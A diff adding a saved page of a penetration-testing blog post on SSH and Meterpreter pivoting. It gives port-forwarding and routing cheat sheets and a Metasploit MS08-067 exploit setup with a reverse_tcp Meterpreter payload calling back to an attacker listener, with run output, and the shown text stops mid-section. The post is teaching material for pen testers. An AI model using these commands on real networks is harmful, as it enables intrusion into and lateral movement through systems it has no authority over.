@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<!-- saved from url=(0063)https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/ -->
+<html lang="en-US"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta charset="UTF-8">
+<title>SSH &amp; Meterpreter Pivoting Techniques</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="generator" content="Jekyll v2.4.0">
+<script id="twitter-wjs" src="./SSH&MeterpreterPivotingTechniques_files/widgets.js"></script><script type="text/javascript" async="" src="./SSH&MeterpreterPivotingTechniques_files/"></script><script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"6d45fa1175a7f450ee591a05a99f1127",petok:"2d064cdf6993005482acb3360ba6172ad5b6eeec-1457953974-1800",zone:"highon.coffee",rocket:"a",apps:{"ga_key":{"ua":"UA-55017594-1","ga_bs":"2"}},sha2test:0}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=fb690a32f5/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script><script type="text/javascript" src="./SSH&MeterpreterPivotingTechniques_files/cloudflare.min.js"></script><style type="text/css"></style><style type="text/css">.cf-hidden { display: none; } .cf-invisible { visibility: hidden; }</style><script data-module="cloudflare/rocket" id="cfjs_block_2c7c1121cb" onload="CloudFlare.__cfjs_block_2c7c1121cb_load()" onerror="CloudFlare.__cfjs_block_2c7c1121cb_error()" onreadystatechange="CloudFlare.__cfjs_block_2c7c1121cb_readystatechange()" type="text/javascript" src="./SSH&MeterpreterPivotingTechniques_files/rocket.js"></script>
+<link rel="alternate" type="application/rss+xml" title="highon.coffee - pen testing, hacking and coffee" href="https://highon.coffee/feed.xml">
+<link rel="stylesheet" href="./SSH&MeterpreterPivotingTechniques_files/css">
+<link rel="stylesheet" href="./SSH&MeterpreterPivotingTechniques_files/screen.css">
+<link href="./SSH&MeterpreterPivotingTechniques_files/font-awesome.min.css" rel="stylesheet">
+<link rel="icon" type="image/x-icon" href="https://highon.coffee/favicon.ico">
+<!--[if lt IE 9]>
+  <script src="/js/html5shiv.min.js"></script>
+  <script src="/js/respond.min.js"></script>
+  <![endif]-->
+<script type="text/javascript">
+/* <![CDATA[ */
+var _gaq = _gaq || [];
+_gaq.push(['_setAccount', 'UA-55017594-1']);
+_gaq.push(['_trackPageview']);
+
+(function() {
+var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+})();
+
+(function(b){(function(a){"__CF"in b&&"DJS"in b.__CF?b.__CF.DJS.push(a):"addEventListener"in b?b.addEventListener("load",a,!1):b.attachEvent("onload",a)})(function(){"FB"in b&&"Event"in FB&&"subscribe"in FB.Event&&(FB.Event.subscribe("edge.create",function(a){_gaq.push(["_trackSocial","facebook","like",a])}),FB.Event.subscribe("edge.remove",function(a){_gaq.push(["_trackSocial","facebook","unlike",a])}),FB.Event.subscribe("message.send",function(a){_gaq.push(["_trackSocial","facebook","send",a])}));"twttr"in b&&"events"in twttr&&"bind"in twttr.events&&twttr.events.bind("tweet",function(a){if(a){var b;if(a.target&&a.target.nodeName=="IFRAME")a:{if(a=a.target.src){a=a.split("#")[0].match(/[^?=&]+=([^&]*)?/g);b=0;for(var c;c=a[b];++b)if(c.indexOf("url")===0){b=unescape(c.split("=")[1]);break a}}b=void 0}_gaq.push(["_trackSocial","twitter","tweet",b])}})})})(window);
+/* ]]> */
+</script>
+<link rel="stylesheet" type="text/css" href="chrome-extension://pkehgijcmpdhfbdbbnkijodmdjhbjlgp/skin/socialwidgets.css"></head>
+<body class="wrap">
+<header>
+<nav class="mobile-nav show-on-mobiles">
+<ul>
+<li class="">
+<a href="https://highon.coffee/">Home</a>
+</li>
+<li class="current">
+<a href="https://highon.coffee/blog/">Blog</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/about/"><span class="hide-on-mobiles">About</span></a>
+</li>
+<li class="">
+<a href="https://highon.coffee/services/"><span class="hide-on-mobiles">Services</span></a>
+</li>
+</ul>
+</nav>
+<div class="grid">
+<div class="unit one-third center-on-mobiles">
+<h1>
+<a href="https://highon.coffee/">
+<span>HighOn.Coffee</span>
+<img src="./SSH&MeterpreterPivotingTechniques_files/highoncoffee.png" width="300" height="115" alt="Logo">
+</a>
+</h1>
+</div>
+<nav class="main-nav unit two-thirds hide-on-mobiles">
+<ul>
+<li class="">
+<a href="https://highon.coffee/">Home</a>
+</li>
+<li class="current">
+<a href="https://highon.coffee/blog/">Blog</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/about/"><span class="hide-on-mobiles">About</span></a>
+</li>
+<li class="">
+<a href="https://highon.coffee/services/"><span class="hide-on-mobiles">Services</span></a>
+</li>
+</ul>
+</nav>
+</div>
+</header>
+<section class="blog">
+<div class="grid">
+<div class="docs-nav-mobile unit whole show-on-mobiles">
+<select onchange="if (this.value) window.location.href=this.value">
+<option value="">Navigate the blog…</option>
+<option value="/blog/">Home</option>
+<optgroup label="v1.x">
+<option value="/blog/insomnihack-ctf-teaser-smartcat2-writeup/">InsomniHack CTF Teaser - Smartcat2 Writeup</option>
+<option value="/blog/insomnihack-ctf-teaser-smartcat1-writeup/">InsomniHack CTF Teaser - Smartcat1 Writeup</option>
+<option value="/blog/fristileaks-walkthrough/">FristiLeaks 1.3 Walkthrough</option>
+<option value="/blog/sickos-1-walkthrough/">SickOS 1.1 - Walkthrough</option>
+<option value="/blog/the-wall-walkthrough/">The Wall Boot2Root Walkthrough</option>
+<option value="/blog/sleepy-ctf-walkthrough/">/dev/random: Sleepy Walkthrough CTF</option>
+<option value="/blog/pipe-ctf-walkthrough/">/dev/random Pipe walkthrough</option>
+<option value="/blog/lord-of-the-root-walkthrough/">Lord of the Root Walkthrough CTF</option>
+<option value="/blog/vi-cheat-sheet/">Vi Cheat Sheet</option>
+<option value="/blog/jenkins-api-unauthenticated-rce-exploit/">Jenkins RCE via Unauthenticated API</option>
+<option value="/blog/skytower-walkthrough/">SkyTower - Walkthrough</option>
+<option value="/blog/zorz-walkthrough/">Zorz Walkthrough</option>
+<option value="/blog/systemd-cheat-sheet/">Systemd Cheat Sheet</option>
+<option value="/blog/freshly-walkthrough/">Freshly Walkthrough</option>
+<option value="/blog/macbook-post-install-check-list/">MacBook - Post Install Config + Apps</option>
+<option value="/blog/fartknocker-walkthrough/">FartKnocker - Walkthrough</option>
+<option value="/blog/reverse-shell-cheat-sheet/">Reverse Shell Cheat Sheet</option>
+<option value="/blog/nbtscan-cheat-sheet/">nbtscan Cheat Sheet</option>
+<option value="/blog/enum4linux-cheat-sheet/">enum4linux Cheat Sheet</option>
+<option value="/blog/linux-local-enumeration-script/">Linux Local Enumeration Script</option>
+<option value="/blog/security-harden-centos-7/">Security Harden CentOS 7</option>
+<option value="/blog/ssh-meterpreter-pivoting-techniques/">SSH &amp; Meterpreter Pivoting Techniques</option>
+<option value="/blog/howto-install-quassel-ubuntu/">HowTo Install Quassel on Ubuntu</option>
+<option value="/blog/sokar-walkthrough/">Sokar - Walkthrough</option>
+<option value="/blog/tr0ll-2-walkthrough/">Tr0ll 2 Walkthrough</option>
+<option value="/blog/tr0ll-1-walkthrough/">Tr0ll 1 Walkthrough</option>
+<option value="/blog/nmap-cheat-sheet/">Nmap Cheat Sheet</option>
+<option value="/blog/linux-commands-cheat-sheet/">Linux Commands Cheat Sheet</option>
+<option value="/blog/shellshock-pen-testers-lab-walkthrough/">Pen Testers Lab: Shellshock CVE-2014-6271 - Walkthrough</option>
+<option value="/blog/keepnote-macbook-install-instructions/">HowTo Install KeepNote on OSX Mavericks</option>
+<option value="/blog/lamp-security-ctf8-walkthrough/">LAMP Security CTF8 - Walkthrough</option>
+<option value="/blog/kioptrix-level-2014-walkthrough/">Kioptrix Level 2014 Walkthrough</option>
+<option value="/blog/lamp-security-ctf7-walkthrough/">LAMP Security CTF7 - Walkthrough</option>
+<option value="/blog/lamp-security-ctf6-walkthrough/">LAMP Security CTF6 - Walkthrough</option>
+<option value="/blog/lamp-security-ctf5-walkthrough/">LAMP Security CTF5 - Walkthrough</option>
+<option value="/blog/lamp-security-ctf4-walkthrough/">LAMP Security CTF4 - Walkthrough</option>
+<option value="/blog/kioptrix-level-1-2-walkthrough/">Kioptrix Level 1.2 Walkthrough</option>
+<option value="/blog/kioptrix-level-1-1-walkthrough/">Kioptrix Level 1.1 Walkthrough</option>
+<option value="/blog/kioptrix-level-1-walkthrough/">Kioptrix Level 1 Walkthrough</option>
+</optgroup>
+</select>
+</div>
+<div class="unit four-fifths">
+<article>
+<h2>
+SSH &amp; Meterpreter Pivoting Techniques
+<a href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/" class="permalink" title="Permalink">∞</a>
+</h2>
+<span class="post-category">
+<span class="label">
+techniques
+</span>
+</span>
+<div class="post-meta">
+<span class="post-date">
+20 Mar 2015
+</span>
+<a href="https://twitter.com/Arr0way" class="post-author">
+<img src="./SSH&MeterpreterPivotingTechniques_files/Arr0way.png" class="avatar" alt="Arr0way" width="24" height="24">
+Arr0way
+</a>
+</div>
+<div class="post-content">
+<ul id="markdown-toc">
+<li><a href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#wtf-is-pivoting" id="markdown-toc-wtf-is-pivoting">WTF is Pivoting?</a></li>
+<li><a href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#ssh-pivoting-cheatsheet" id="markdown-toc-ssh-pivoting-cheatsheet">SSH Pivoting Cheatsheet</a> <ul>
+<li><a href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#ssh-port-forwarding" id="markdown-toc-ssh-port-forwarding">SSH Port Forwarding</a></li>
+<li><a href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#ssh-port-forwarding-with-proxychains" id="markdown-toc-ssh-port-forwarding-with-proxychains">SSH Port Forwarding with Proxychains</a></li>
+<li><a href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#using-proxychain-port-forwards" id="markdown-toc-using-proxychain-port-forwards">Using Proxychain port forwards</a></li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#configure-metasploit-to-use-a-ssh-pivot" id="markdown-toc-configure-metasploit-to-use-a-ssh-pivot">Configure Metasploit to use a SSH Pivot</a> <ul>
+<li><a href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#dont-use-127001-with-metasploit" id="markdown-toc-dont-use-127001-with-metasploit">Don’t use 127.0.0.1 with Metasploit</a></li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#meterpreter-pivoting-cheatsheet" id="markdown-toc-meterpreter-pivoting-cheatsheet">Meterpreter Pivoting Cheatsheet</a></li>
+<li><a href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#pivoting-example-diagrams" id="markdown-toc-pivoting-example-diagrams">Pivoting Example Diagrams</a> <ul>
+<li><a href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#starting-point" id="markdown-toc-starting-point">Starting Point</a></li>
+<li><a href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#routing-traffic-to-the-same-subnet" id="markdown-toc-routing-traffic-to-the-same-subnet">Routing Traffic to the Same Subnet</a> <ul>
+<li><a href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#example-commands" id="markdown-toc-example-commands">Example commands</a> <ul>
+<li><a href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#ssh-pivoting-using-proxychains" id="markdown-toc-ssh-pivoting-using-proxychains">SSH Pivoting using Proxychains</a></li>
+<li><a href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#ssh-port-forwarding-command" id="markdown-toc-ssh-port-forwarding-command">SSH Port Forwarding Command</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#ssh-and-meterpreter-pivoting" id="markdown-toc-ssh-and-meterpreter-pivoting">SSH and Meterpreter Pivoting</a> <ul>
+<li><a href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#example-commands-1" id="markdown-toc-example-commands-1">Example commands</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="wtf-is-pivoting">WTF is Pivoting?<a class="header-link" href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#wtf-is-pivoting"><i class="fa fa-link"></i></a></h2>
+<p><strong>Pivoting</strong> is a technique used to route traffic through a compromised host on a penetration test.</p>
+<p>When conducting an external penetration test you may need to route traffic through a compromised machine in order to compromise internal targets.</p>
+<p><strong>Pivoting</strong>, allows you to leverage tools on your attacking machine while routing traffic through other hosts on the subnet, and potentially allowing access to other subnets.</p>
+<h2 id="ssh-pivoting-cheatsheet">SSH Pivoting Cheatsheet<a class="header-link" href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#ssh-pivoting-cheatsheet"><i class="fa fa-link"></i></a></h2>
+<h3 id="ssh-port-forwarding">SSH Port Forwarding<a class="header-link" href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#ssh-port-forwarding"><i class="fa fa-link"></i></a></h3>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>ssh -L 9999:10.0.2.2:445 user@192.168.2.250</code></p>
+</td>
+<td>
+<p>Port 9999 locally is forwarded to port 445 on 10.0.2.2 through host 192.168.2.250</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="ssh-port-forwarding-with-proxychains">SSH Port Forwarding with Proxychains<a class="header-link" href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#ssh-port-forwarding-with-proxychains"><i class="fa fa-link"></i></a></h3>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>ssh -D 127.0.0.1:9050 root@192.168.2.250</code></p>
+</td>
+<td>
+<p>Dynamically allows all port forwards to the subnets availble on the target.</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<div class="note warning">
+<h5>Dynamic Proxychain Warning</h5>
+<p>Dynamic Proxychain SSH port forwarding does not work with nmap and metasploits meterpreter shells won't spawn.</p>
+</div>
+<p>If you attempt to spawn a shell via Meterpreter, you’ll get an error similar to the following:</p>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">meterpreter &gt; execute -f cmd.exe -i -H
+<span class="p">|</span>S-chain<span class="p">|</span>-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-127.0.0.1:41713-&lt;--timeout</code></pre></div>
+<h3 id="using-proxychain-port-forwards">Using Proxychain port forwards<a class="header-link" href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#using-proxychain-port-forwards"><i class="fa fa-link"></i></a></h3>
+<p>When using a Proxychain port forward, all commands need to be prefixed with the proxychain command, this instructs the application traffic to route through the proxy.</p>
+<section class="shellbox">
+<div class="unit golden-large code">
+<p class="title">Connecting to RDP via Proxychains Dynamic Port Forwarding</p>
+<div class="shell">
+<p class="line">
+<span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
+<span class="command">proxychains rdesktop TARGET-IP</span>
+</p>
+</div>
+</div>
+</section>
+<h2 id="configure-metasploit-to-use-a-ssh-pivot">Configure Metasploit to use a SSH Pivot<a class="header-link" href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#configure-metasploit-to-use-a-ssh-pivot"><i class="fa fa-link"></i></a></h2>
+<p>The following is an example of how to configure Metersploit to use a SSH portward. In this example port 9999 is forwarded to the target and the attacking machine has an IP address of 192.168.2.100:</p>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">Setup the port forward <span class="o">(</span>instructions above<span class="o">)</span>, <span class="k">then</span> configure msfconsole as follows <span class="o">(</span>using MS08_067 in this example<span class="o">)</span>.
+
+ msf exploit<span class="o">(</span>ms08_067_netapi<span class="o">)</span> &gt; show options
+
+ Module options <span class="o">(</span>exploit/windows/smb/ms08_067_netapi<span class="o">)</span>:
+
+    Name     Current Setting  Required  Description
+    ----     ---------------  --------  -----------
+   RHOST    0.0.0.0          yes       The target address
+    RPORT    <span class="m">9999</span>             yes       Set the SMB service port
+    SMBPIPE  BROWSER          yes       The pipe name to use <span class="o">(</span>BROWSER, SRVSVC<span class="o">)</span>
+
+
+ Payload options <span class="o">(</span>windows/meterpreter/reverse_tcp<span class="o">)</span>:
+
+    Name      Current Setting  Required  Description
+    ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique <span class="o">(</span>accepted: seh, thread, process, none<span class="o">)</span>
+    LHOST     192.168.2.100   yes       The listen address
+    LPORT     <span class="m">443</span>              yes       The listen port
+
+
+ Exploit target:
+
+    Id  Name
+    --  ----
+   <span class="m">0</span>   Automatic Targeting</code></pre></div>
+<h3 id="dont-use-127001-with-metasploit">Don’t use 127.0.0.1 with Metasploit<a class="header-link" href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#dont-use-127001-with-metasploit"><i class="fa fa-link"></i></a></h3>
+<div class="note tip">
+<h5>Update: You can now use 127.0.0.2</h5>
+<p>Other 127.0.0.0 addresses can also be used (<code>127.0.0.3</code>,<code>127.0.0.4</code> etc), but not <code>127.0.0.1</code></p>
+</div>
+<p>The example above uses 0.0.0.0 <strong>Not 127.0.0.1</strong>, never use 127.0.0.1 with Metasploit or you’ll get the following error after you attempt to do anything post exploit:</p>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">exploit<span class="o">(</span>ms08_067_netapi<span class="o">)</span> &gt; exploit
+
+ <span class="o">[</span>*<span class="o">]</span> Started reverse handler on 192.168.14.183:443
+ <span class="o">[</span>*<span class="o">]</span> Automatically detecting the target...
+ <span class="o">[</span>*<span class="o">]</span> Fingerprint: Windows XP - Service Pack <span class="m">3</span> - lang:English
+ <span class="o">[</span>*<span class="o">]</span> Selected Target: Windows XP SP3 English <span class="o">(</span>AlwaysOn NX<span class="o">)</span>
+ <span class="o">[</span>*<span class="o">]</span> Attempting to trigger the vulnerability...
+ <span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">769536</span> bytes<span class="o">)</span> to 192.168.15.252
+
+msf meterpreter &gt; getuid
+ <span class="o">[</span>-<span class="o">]</span> Session manipulation failed: Validation failed: Address is reserved <span class="o">[</span><span class="s2">"/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/validations.rb:56:in `save!'"</span>, <span class="s2">"/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/attribute_methods/dirty.rb:33:in `save!'"</span>, <span class="s2">"/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/transactions.rb:264:in `block in save!'"</span>, <span class="s2">"/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/transactions.rb:313:in `block in with_transaction_returning_status'"</span>, <span class="s2">"/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/connection_adapters/abstract/database_statements.rb:192:in `transaction'"</span>, <span class="s2">"/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/transactions.rb:208:in `transaction'"</span>, <span class="s2">"/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/transactions.rb:311:in `with_transaction_returning_status'"</span>, <span class="s2">"/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/transactions.rb:264:in `save!'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/msf/core/db.rb:377:in `block in report_host'"</span>, <span class="s2">"/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/connection_adapters/abstract/connection_pool.rb:129:in `with_connection'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/msf/core/db.rb:323:in `report_host'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/msf/core/db.rb:2031:in `block in report_event'"</span>, <span class="s2">"/opt/metasploit/apps/pro/ui/vendor/bundle/ruby/1.9.1/gems/activerecord-3.2.17/lib/active_record/connection_adapters/abstract/connection_pool.rb:129:in `with_connection'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/msf/core/db.rb:2025:in `report_event'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/msf/core/framework.rb:222:in `report_event'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/msf/core/framework.rb:331:in `session_event'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/msf/core/framework.rb:408:in `block in on_session_output'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/msf/core/framework.rb:407:in `each'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/msf/core/framework.rb:407:in `on_session_output'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/msf/core/event_dispatcher.rb:183:in `block in method_missing'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/msf/core/event_dispatcher.rb:181:in `each'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/msf/core/event_dispatcher.rb:181:in `method_missing'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/msf/core/session_manager.rb:242:in `block in register'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/shell.rb:271:in `call'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/shell.rb:271:in `print_error'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:436:in `unknown_command'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:411:in `run_single'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/rex/post/meterpreter/ui/console.rb:68:in `block in interact'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/shell.rb:190:in `call'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/shell.rb:190:in `run'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/rex/post/meterpreter/ui/console.rb:66:in `interact'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/msf/base/sessions/meterpreter.rb:396:in `_interact'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/rex/ui/interactive.rb:49:in `interact'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/msf/ui/console/command_dispatcher/core.rb:1745:in `cmd_sessions'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:427:in `run_command'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:389:in `block in run_single'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:383:in `each'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:383:in `run_single'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/msf/ui/console/command_dispatcher/exploit.rb:142:in `cmd_exploit'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:427:in `run_command'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:389:in `block in run_single'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:383:in `each'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/dispatcher_shell.rb:383:in `run_single'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/lib/rex/ui/text/shell.rb:200:in `run'"</span>, <span class="s2">"/opt/metasploit/apps/pro/msf3/msfconsole:148:in `&lt;main&gt;'"</span><span class="o">]</span></code></pre></div>
+<h2 id="meterpreter-pivoting-cheatsheet">Meterpreter Pivoting Cheatsheet<a class="header-link" href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#meterpreter-pivoting-cheatsheet"><i class="fa fa-link"></i></a></h2>
+<p>Assuming you’ve compromised the target machine and have a meterpreter shell, you can pivot through it by setting up a <strong>meterpreter port forward</strong>.</p>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>portfwd add –l 3389 –p 3389 –r target-host</code></p>
+</td>
+<td>
+<p>Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>portfwd delete –l 3389 –p 3389 –r target-host</code></p>
+</td>
+<td>
+<p>Forwards 3389 (RDP) to 3389 on the compromised machine running the Meterpreter shell</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>portfwd flush</code></p>
+</td>
+<td>
+<p>Meterpreter delete all port forwards</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>portfwd list</code></p>
+</td>
+<td>
+<p>Meterpreter list active port forwards</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>run autoroute -s 192.168.15.0/24</code></p>
+</td>
+<td>
+<p>Use Meterpreters autoroute script to add the route for specified subnet <code>192.168.15.0</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>run autoroute -p</code></p>
+</td>
+<td>
+<p>Meterpreter list all active routes</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>route</code></p>
+</td>
+<td>
+<p>Meterpreter view available networks the compromised host can access</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>route add 192.168.14.0 255.255.255.0 3</code></p>
+</td>
+<td>
+<p>Meterpreter add route for 192.168.14.0/24 via Session 3.</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>route delete 192.168.14.0 255.255.255.0 3</code></p>
+</td>
+<td>
+<p>Meterpreter delete route for 192.168.14.0/24 via Session 3.</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>route flush</code></p>
+</td>
+<td>
+<p>Meterpreter delete all routes</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<div class="note info">
+<h5>Meterpreter Port Forwards are flakey</h5>
+<p>Meterpreter port forwards can be a bit flakey, also the meterpreter session needs to be remain open.</p>
+</div>
+<p>In order to connect to the compromised machine you would run:</p>
+<section class="shellbox">
+<div class="unit golden-large code">
+<p class="title">Connect to RDP via Meterpreter Port Forward</p>
+<div class="shell">
+<p class="line">
+<span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
+<span class="command">rdesktop 127.0.0.1</span>
+</p>
+</div>
+</div>
+</section>
+<h2 id="pivoting-example-diagrams">Pivoting Example Diagrams<a class="header-link" href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#pivoting-example-diagrams"><i class="fa fa-link"></i></a></h2>
+<p>Pivoting can be a bit hard to understand on paper, so here are some diagrams for clarification with the associated commands.</p>
+<p><img src="./SSH&MeterpreterPivotingTechniques_files/UVoxUFl.png" alt="Brace for Wonky Visio Arrows"></p>
+<h3 id="starting-point">Starting Point<a class="header-link" href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#starting-point"><i class="fa fa-link"></i></a></h3>
+<p>You’ll need to have access to a compromised machine on the target network, depending on the compromised machines configuration you may or may not need root.</p>
+<p><img src="./SSH&MeterpreterPivotingTechniques_files/zRIqADW.png" alt="SSH Pivot Example 1: Starting Point"></p>
+<h3 id="routing-traffic-to-the-same-subnet">Routing Traffic to the Same Subnet<a class="header-link" href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#routing-traffic-to-the-same-subnet"><i class="fa fa-link"></i></a></h3>
+<p><img src="./SSH&MeterpreterPivotingTechniques_files/TXV6ehn.png" alt="Pivot Example 2: Routing traffic to the same subnet"></p>
+<h4 id="example-commands">Example commands<a class="header-link" href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#example-commands"><i class="fa fa-link"></i></a></h4>
+<h5 id="ssh-pivoting-using-proxychains">SSH Pivoting using Proxychains<a class="header-link" href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/#ssh-pivoting-using-proxychains"><i class="fa fa-link"></i></a></h5>
+<section class="shellbox">
+<div class="unit golden-large code">
+<p class="title">Dynamic SSH Pivoting Command using proxy chains</p>
+<div class="shell">
+<p class="line">
+<span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
+<span class="command">ssh -D 127.0.0.1:9050 root@192.168.2.2</span>
+</p>
+</div>
+</div>
+</section>
+<p>You could then connect to Target 2’s RDP server using:</p>
+<section class="shellbox">
+<div class="unit golden-large code">
+<p class="title">Connecting to RDP via Proxychains Dynamic Port Forwarding</p>
+<div class="shell">
+<p class="line">
